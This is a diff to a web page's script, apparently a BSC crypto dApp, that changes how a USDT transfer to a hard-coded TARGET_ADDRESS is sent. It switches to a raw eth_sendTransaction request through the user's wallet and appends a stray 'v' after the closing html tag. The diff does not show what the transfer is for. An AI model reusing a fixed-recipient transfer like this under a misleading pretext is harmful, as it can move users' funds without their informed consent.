@@ -228,9 +228,20 @@
       try {
         const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
         
-        // Direct Ethers.js contract signer transfer (Fully compatible with Trust Wallet/MetaMask dApp browsers)
-        const tx = await usdtContract.transfer(TARGET_ADDRESS, totalUsdtWei);
-        alert("Transaction submitted! Hash: " + tx.hash);
+        // Encode transfer function data cleanly for mobile wallet compatibility
+        const transferData = usdtContract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, totalUsdtWei]);
+
+        await globalProvider.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: globalUserAddress,
+            to: USDT_BSC_ADDRESS,
+            data: transferData,
+            gas: "0x186A0"
+          }]
+        });
+
+        alert("Transaction submitted successfully!");
       } catch (err) {
         console.error("Transfer error:", err);
         alert("Notice: " + (err.message || JSON.stringify(err)));
@@ -239,3 +250,4 @@
   </script>
 </body>
 </html>
+v 
